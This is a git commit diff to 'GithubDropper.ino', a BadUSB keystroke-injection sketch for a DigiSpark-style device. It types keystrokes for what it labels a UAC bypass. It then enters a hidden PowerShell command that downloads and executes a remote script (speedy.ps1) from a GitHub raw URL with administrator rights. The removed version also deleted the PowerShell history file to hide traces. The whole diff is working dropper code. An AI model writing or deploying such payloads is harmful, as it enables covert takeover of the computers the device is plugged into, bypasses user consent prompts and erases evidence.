7b96e8302751522c686a397780e14d3e51fbd0e5
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-07-30 11:52:49 +1000

    Update GithubDropper.ino
    UAC Boosted

--- GithubDropper.ino
+++ GithubDropper.ino
@@ -14,33 +14,21 @@ void setup() {
 
 // start UAC Bypass
 //
-  Keyboard.sendKeyStroke(KEY_DEL, MOD_CTRL_RIGHT | MOD_ALT_RIGHT);
-  Keyboard.delay(500);
-  Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(50);
-  Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(50);
-  Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(50);
-  Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(50);
-  Keyboard.sendKeyStroke(KEY_ENTER);
-  Keyboard.delay(500);
+  Keyboard.sendKeyStroke(KEY_ESC, MOD_CTRL_RIGHT | MOD_SHIFT_RIGHT);
+  Keyboard.delay(200);
   Keyboard.sendKeyStroke(KEY_F, MOD_ALT_RIGHT);
-  Keyboard.delay(50);
+  Keyboard.delay(200);
   Keyboard.sendKeyStroke(KEY_N);
-  Keyboard.delay(100);
+  Keyboard.delay(300);
 
 // enter commands to be run as administrator
 //
-  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -useb http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/speedy.ps1);Remove-Item -Path \\\"$env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\\\";exit\"");
+  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/speedy.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
   Keyboard.delay(200);
-
-
 // end UAC bypass
 //
   Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(200);  
+  Keyboard.delay(100);  
   Keyboard.sendKeyStroke(KEY_SPACE);
   Keyboard.delay(200);
   Keyboard.sendKeyStroke(KEY_ENTER);
